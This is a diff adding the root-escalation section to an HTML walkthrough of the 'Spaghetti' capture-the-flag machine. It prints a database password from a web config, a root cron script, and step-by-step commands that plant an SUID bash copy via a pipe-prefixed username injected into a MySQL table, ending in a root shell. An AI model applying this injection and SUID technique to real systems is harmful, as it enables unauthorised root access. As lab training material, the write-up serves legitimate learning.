@@ -14,7 +14,8 @@ layout: default
     <hr>
 
     <h2>Summary</h2>
-    <p></p>
+
+    <p>Gainin a foothold on Spaghetti involved exploiting a command being offered by a bot on an irc server.  Exploitation of this command leads to a RCE as a low privilege user.  Once in the box, we are able to achieve root command execution by exploiting a script that root runs as a part of a cronjob.  This script uses contents of the mysql table "mailbox" for the parameters that it passes.  The mysql credentials are found in the web server.  Upon modifying the contents of mysql we are able to execute our own malicious script as root.</p>
 
     <h2>Port Scanning</h2>
 
@@ -139,8 +140,41 @@ zsh: suspended  nc -lvnp 4444
 hostmaster@spaghetti:/var/www/postfixadmin$ cat config.local.php &#13;&#10;&lt;?php&#13;&#10;$CONF[&apos;configured&apos;] = true;&#13;&#10;$CONF[&apos;password_expiration&apos;] = &apos;YES&apos;;&#13;&#10;$CONF[&apos;database_type&apos;] = &apos;mysqli&apos;;&#13;&#10;$CONF[&apos;database_host&apos;] = &apos;localhost&apos;;&#13;&#10;$CONF[&apos;database_user&apos;] = &apos;postfixadmin&apos;;&#13;&#10;$CONF[&apos;database_password&apos;] = &apos;P4s8vV0r6&apos;;&#13;&#10;$CONF[&apos;database_name&apos;] = &apos;postfixadmin&apos;;
         </pre>
 
+        <li>Up front, the only interesting thing in the mysql database is a password hash that I am unable to crack.  So I continue looking.  The next interesting thing I find is the script /opt/check_mailpass_expiration.sh</li>
 
+        <pre>
+hostmaster@spaghetti:/opt$ cat check_mailpass_expiration.sh &#13;&#10;#!/bin/bash&#13;&#10;#Adapt to your setup&#13;&#10;&#13;&#10;POSTFIX_DB=&quot;postfixadmin&quot;&#13;&#10;MYSQL_CREDENTIALS_FILE=&quot;/root/postfixadmin.my.cnf&quot;&#13;&#10;&#13;&#10;REPLY_ADDRESS=noreply@spaghetti.lan&#13;&#10;&#13;&#10;# Change this list to change notification times and when ...&#13;&#10;for INTERVAL in 30 14 7&#13;&#10;do&#13;&#10;    LOWER=$(( $INTERVAL - 1 ))&#13;&#10;&#13;&#10;    QUERY=&quot;SELECT username,password_expiry FROM mailbox WHERE password_expiry &gt; now() + interval $LOWER DAY AND password_expiry &lt; NOW() + interval $INTERVAL DAY&quot;&#13;&#10;&#13;&#10;    mysql --defaults-extra-file=&quot;$MYSQL_CREDENTIALS_FILE&quot; &quot;$POSTFIX_DB&quot; -B -e &quot;$QUERY&quot; | while read -a RESULT ; do&#13;&#10;        echo -e &quot;Dear User, \n Your password will expire on ${RESULT[1]}&quot; | mail -s &quot;Password 30 days before expiration notication&quot; -r $REPLY_ADDRESS  ${RESULT[0]}&#13;&#10;    done&#13;&#10;&#13;&#10;done
+        </pre>
 
+        <li>This is a script that sends a notification to each user from the mailbox table of the mysql database whenever their password expiration date is 7, 14, and 30 days away.  Based on the fact that this is a ctf scenario and the fact that this file is owned by root, executable, but not writable by us, leads me to believe that root is executing this file.  We transfer the program pspy64 to the machine and run it to look at proccesses that are being ran.  pspy confirms that root is executing this file.</li>
+        
+        <pre>
+hostmaster@spaghetti:/tmp$ ./pspy64&#13;&#10;./pspy64&#13;&#10;pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855&#13;&#10;&#13;&#10;&#13;&#10;     &block;&block;&blk34;&block;&block;&block;    &block;&block;&block;&block;&block;&block;  &block;&block;&blk34;&block;&block;&block; &blk34;&block;&block;   &block;&block;&blk34;&#13;&#10;    &blk34;&block;&block;&blk14;  &block;&block;&blk12;&blk12;&block;&block;    &blk12; &blk34;&block;&block;&blk14;  &block;&block;&blk12;&blk12;&block;&block;  &block;&block;&blk12;&#13;&#10;    &blk34;&block;&block;&blk14; &block;&block;&blk34;&blk12;&blk14; &blk34;&block;&block;&lhblk;   &blk34;&block;&block;&blk14; &block;&block;&blk34;&blk12; &blk12;&block;&block; &block;&block;&blk14;&#13;&#10;    &blk12;&block;&block;&lhblk;&block;&blk34;&blk12; &blk12;  &blk12;   &block;&block;&blk12;&blk12;&block;&block;&lhblk;&block;&blk34;&blk12; &blk12; &blk14; &#9616;&block;&block;&blk34;&blk14;&#13;&#10;    &blk12;&block;&block;&blk12; &blk14;  &blk14;&blk12;&block;&block;&block;&block;&block;&block;&blk12;&blk12;&blk12;&block;&block;&blk12; &blk14;  &blk14; &blk14; &block;&block;&blk12;&blk34;&blk14;&#13;&#10;    &blk12;&blk34;&blk12;&blk14; &blk14;  &blk14;&blk12; &blk12;&blk34;&blk12; &blk12; &blk14;&blk12;&blk34;&blk12;&blk14; &blk14;  &blk14;  &block;&block;&blk12;&blk12;&blk12; &#13;&#10;    &blk14;&blk12; &blk14;     &blk14; &blk14;&blk12;  &blk14; &blk14;&blk14;&blk12; &blk14;     &blk34;&block;&block; &blk14;&blk12;&blk14; &#13;&#10;    &blk14;&blk14;       &blk14;  &blk14;  &blk14;  &blk14;&blk14;       &blk12; &blk12; &blk14;&blk14;  &#13;&#10;                   &blk14;           &blk14; &blk14;     &#13;&#10;                               &blk14; &blk14;     &#13;&#10;&#13;&#10;Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)&#13;&#10;Draining file system events due to startup...&#13;&#10;done&#13;&#10;2021/09/20 18:36:44 CMD: UID=0    PID=990    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal &#13;&#10;2021/09/20 18:36:44 CMD: UID=0    PID=99     | &#13;&#10;2021/09/20 18:36:44 CMD: UID=112  PID=986    | /usr/sbin/mysqld &#13;&#10;2021/09/20 18:36:44 CMD: UID=0    PID=98     | &#13;&#10;2021/09/20 18:36:44 CMD: UID=33   PID=974    | php-fpm: pool www                                                             &#13;&#10;2021/09/20 18:36:44 CMD: UID=33   PID=973    | php-fpm: pool www                                                             &#13;&#10;(LINES REMOVED)&#13;&#10;2021/09/20 18:37:01 CMD: UID=0    PID=228290 | /usr/sbin/CRON -f &#13;&#10;2021/09/20 18:37:01 CMD: UID=0    PID=228293 | /bin/sh -c /opt/check_mailpass_expiration.sh 
+        </pre>
+
+        <li>Now that we know root is running this command, we also know that we can get command execution as root if we can exploit this script somehow.  This script is checking the user's password expiration date and if it is going to expire in 7, 14, or 30 days, then it sends them a notification.  ${RESULT[0]} is where the username from the mysql table "mailbox" is inserted into the script.  We are going to create a malicious script that we will pass to /opt/check_mailpass_expiration.sh that will create a root owned SUID bash file in the /tmp directory.</li>
+
+        <li>The malicious script</li>
+
+        <pre>
+hostmaster@spaghetti:/tmp$ cat rooted.sh 
+cp /bin/bash /tmp/rooted; chmod +s /tmp/rooted;
+hostmaster@spaghetti:/tmp$ chmod +x rooted.sh
+        </pre>
+
+        <li>Now we will change the username in the mysql table "mailbox" to our script with a pipe in front of it.  Then we will change the password expiration date to 7 days from now in order to trigger root to run the script.</li>
+
+        <pre>
+mysql&gt; select username,password_expiry from mailbox;&#13;&#10;+----------------------------+---------------------+&#13;&#10;| username                   | password_expiry     |&#13;&#10;+----------------------------+---------------------+&#13;&#10;| giuseppe.verdi@private.lan | 2021-09-27 18:57:24 |&#13;&#10;+----------------------------+---------------------+&#13;&#10;1 row in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; update mailbox set username=&apos;|/tmp/rooted.sh&apos;;&#13;&#10;Query OK, 1 row affected (0.00 sec)&#13;&#10;Rows matched: 1  Changed: 1  Warnings: 0&#13;&#10;&#13;&#10;mysql&gt; update mailbox set password_expiry=(select now() + interval 7 day);&#13;&#10;Query OK, 1 row affected (0.01 sec)&#13;&#10;Rows matched: 1  Changed: 1  Warnings: 0
+        </pre>
+
+        <li>Now we wait a little bit and the file "rooted" should be created in the /tmp directory.  It will be owned by root with the suid bit set.  We execute this file with the -p flag and we get root.  The -p flag means persistent.  It saves the root permissions of the bash file to our own session.</li>
+
+        <pre>
+hostmaster@spaghetti:/tmp$ ls -la /tmp/rooted&#13;&#10;-rwsr-sr-x 1 root root 1183448 Sep 20 19:07 /tmp/rooted&#13;&#10;hostmaster@spaghetti:/tmp$ ./rooted -p&#13;&#10;rooted-5.0# id&#13;&#10;uid=1000(hostmaster) gid=1000(hostmaster) euid=0(root) egid=0(root) groups=0(root),33(www-data),1000(hostmaster)&#13;&#10;rooted-5.0# 
+        </pre>
+
+        <li>Rooted.</li>
 
 </body>
 </html>
